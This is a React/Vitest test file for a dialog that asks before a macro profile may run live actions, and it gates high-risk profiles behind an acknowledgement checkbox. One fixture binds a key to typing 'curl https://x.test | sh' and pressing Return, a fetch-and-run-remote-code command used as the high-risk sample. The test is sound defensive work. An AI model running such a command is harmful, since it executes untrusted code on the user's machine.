import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { liveOfferCopy, LiveOfferDialog } from './LiveOfferDialog';
import { emptyKeypadPage } from './keypad-model';
import type { Profile } from './contracts';

const flat: Profile = { schema_version: 1, name: 'Everyday', bindings: [] };
const root = emptyKeypadPage();
root.slots[1] = { type: 'folder', page_id: 'sub' };
// A high-risk profile: pastes a snippet into the focused app and presses Return.
const risky: Profile = { schema_version: 1, name: 'Ops', bindings: [{ module: 'm003k', control: 0, gesture: 'pressed', action: { type: 'text', text: 'curl https://x.test | sh', press_enter: true } }] };

describe('the one-time Live offer', () => {
  it('asks once, names the open profile and points at the header badge', () => {
    const copy = liveOfferCopy(flat);
    expect(copy.title).toBe('Run actions on this Mac?');
    expect(copy.message).toContain('"Everyday"');
    expect(copy.message).toContain('Live/Test badge in the header');
    expect(copy.risk).not.toBe('high');
    expect(copy.warning).toBeNull();
    expect(copy.acknowledge).toBeNull();
    const markup = renderToStaticMarkup(<LiveOfferDialog open profile={flat} onConfirm={() => {}} onDecline={() => {}} />);
    expect(markup).toContain('id="live-offer-title"');
    expect(markup).toContain('role="alertdialog"');
    expect(markup).toContain('>Stay in Test mode</button>');
    expect(markup).toContain('>Run actions</button>');
    // No acknowledgement box for a low-risk profile.
    expect(markup).not.toContain('execute-acknowledge');
  });
  it('a high-risk profile warns and keeps Run actions off until it is acknowledged', () => {
    const copy = liveOfferCopy(risky);
    expect(copy.risk).toBe('high');
    expect(copy.warning).toContain('High risk.');
    expect(copy.acknowledge).toBe('I reviewed this profile and trust its source');
    const ungated = renderToStaticMarkup(<LiveOfferDialog open profile={risky} onConfirm={() => {}} onDecline={() => {}} />);
    expect(ungated).toContain('id="live-offer-warning"');
    expect(ungated).toMatch(/<button type="button" class="button danger" disabled="">Run actions</);
    const gated = renderToStaticMarkup(<LiveOfferDialog open profile={risky} acknowledged setAcknowledged={() => {}} onConfirm={() => {}} onDecline={() => {}} />);
    expect(gated).toMatch(/<button type="button" class="button danger">Run actions</);
    expect(gated).toMatch(/<input type="checkbox" checked=""/);
  });
  it('renders closed without the open attribute, like every dialog', () => {
    const markup = renderToStaticMarkup(<LiveOfferDialog open={false} profile={flat} onConfirm={() => {}} onDecline={() => {}} />);
    expect(markup).toMatch(/<dialog role="alertdialog"(?! open)/);
  });
});
